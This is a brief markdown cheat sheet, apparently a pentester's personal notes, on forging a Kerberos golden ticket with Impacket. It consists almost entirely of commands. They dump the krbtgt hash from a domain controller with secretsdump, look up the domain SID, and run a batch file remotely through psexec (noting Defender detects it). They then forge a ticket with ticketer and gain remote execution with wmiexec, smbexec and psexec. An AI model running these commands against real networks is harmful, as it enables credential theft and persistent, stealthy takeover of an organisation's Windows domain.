## Golden Ticket with Impacket
### Aquire
#### krbtgt hash
* ZeroLogon  
* Impacket ``secretsdump.py Administrator:Password1@192.168.149.121 | grep krbtgt | grep ::: > ~/win2016; cat ~/win2016``  
* Mimikatz  
#### Domain SID
* Impacket ``lookupsid.py Administrator:Password1@192.168.149.121 | grep "Domain SID" >> ~/win2016; cat ~/win2016``  
#### Domain Name
* Impacket (detected by defender)
  ``echo "powershell Get-WmiObject Win32_ComputerSystem" > ~/GetDomain.bat``  
  ``psexec.py Administrator:Password1@192.168.149.121 -c ~/GetDomain.bat | grep Domain >> ~/win2016; cat ~/win2016``  
### Create Ticket (sudo?)
``ticketer.py -nthash _KRBTGT_HASH_ -domain-sid _DOMAIN_SID_ -domain _DOMAIN_ user``
### Use the Ticket
``export KRB5CCNAME=/home/r0n1n/goldenTicket/ghost.ccache``  
``wmiexec.py _DOMAIN_/ghost@_DC_FQDN_ -k -no-pass``  
``smbexec.py _DOMAIN_/ghost@_DC_FQDN_ -k -no-pass``  
``psexec.py _DOMAIN_/ghost@_DC_FQDN_ -k -no-pass``

